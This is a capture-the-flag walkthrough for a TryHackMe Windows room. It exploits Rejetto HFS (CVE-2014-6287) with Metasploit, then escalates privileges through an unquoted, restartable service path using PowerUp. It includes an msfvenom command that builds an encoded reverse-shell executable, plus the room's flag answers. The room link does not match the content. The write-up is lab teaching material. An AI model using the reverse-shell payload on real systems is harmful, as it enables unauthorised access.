 **Difficulty**: Easy  
**Platform**: TryHackMe  
**Room Link**: https://tryhackme.com/room/kenobi    
**Author**: Ry@n

---
## Overview
Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.
## Recon using nmap
![Nmap Scan](images/Pasted%20image%2020250816212259.png)
# Task 1:
## 1. Who is the employee of the month?:
- Answer: Bill Harper
	- We can find the name by using reverse image search:
	![Reverse Search](images/Pasted%20image%2020250816212607.png)
# Task 2: Initial Access
## 1. Scan the machine with nmap. What is the other port running a web server on?
- Answer: 8080
	- `nmap 10.201.75.76 -T 4 -A`
	![Nmap Output](images/Pasted%20image%2020250816213145.png)
	- We can see that port 8080 is running a HttpFileServer
## 2.Take a look at the other web server. What file server is running?
 - Answer: Rejetto HTTP File Server
	 - To find the name of the file we need to check the server info
	  ![Server Info 1](images/Pasted%20image%2020250816213722.png)
	  ![Server Info 2](images/Pasted%20image%2020250816213836.png)
## 3. What is the CVE number to exploit this file server?
- Answer: 2014-6287
	- To find the CVE number is fairly easy, just put Rejetto Http File Server 2.3 in the search function on exploit-db
	![ExploitDB](images/Pasted%20image%2020250816214347.png)
## 4. Use Metasploit to get an initial shell. What is the user flag?
- Answer: ��b04763b6fcf51fcd7c13abc7db4fd365
	- Here is the step:
	![Exploit 1](images/Pasted%20image%2020250816215552.png)
	![Exploit 2](images/Pasted%20image%2020250816215659.png)
	![Exploit 3](images/Pasted%20image%2020250816215715.png)
# Task 3: Privilege Escalation
- Now that you have an initial shell on this Windows machine as Bill, we can further enumerate the machine and escalate our privileges to root!
- To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "_PowerUp aims to be a clearinghouse of common Windows privilege escalation_ _vectors that rely on misconfigurations._" 
- Here is the script: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
- After download it, we can use the **upload** command in Metasploit to upload the script
	![Upload Script](images/Pasted%20image%2020250816220419.png)
- To execute the script we need a power shell ![PowerShell Shell](images/Pasted%20image%2020250816220605.png)
- After we got the shell let execute the script 
	![Run PowerUp](images/Pasted%20image%2020250816220844.png)
## 1.Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?
- Answer: AdvancedSystemCareService9
	- Here is the service that had the CanRestart option set to true
![Service Info](images/Pasted%20image%2020250816221149.png)
	 - The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!
- Now we need to use msfvenom to generate a reverse shell as an Windows executable.
`msfvenom -p windows/shell_reverse_tcp LHOST=10.4.127.243 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe`
 ![Payload Creation](images/Pasted%20image%2020250816221452.png)
- After we got our reverse shell, we need to upload it
 ![Upload Payload](images/Pasted%20image%2020250816223353.png)
- After that we need to setup a listener using nc 
 ![Netcat Listener](images/Pasted%20image%2020250816223508.png)
 - Now we need to stop the service, overwrite the file with our payload then restart it
 ![Restart Service](images/Pasted%20image%2020250816223618.png)
 - Now we got a connection from the machine
## 2. What is the root flag?
- Answer:9af5f314f57607c00fd09803a587db80
- ![Root Flag](images/Pasted%20image%2020250816223802.png)
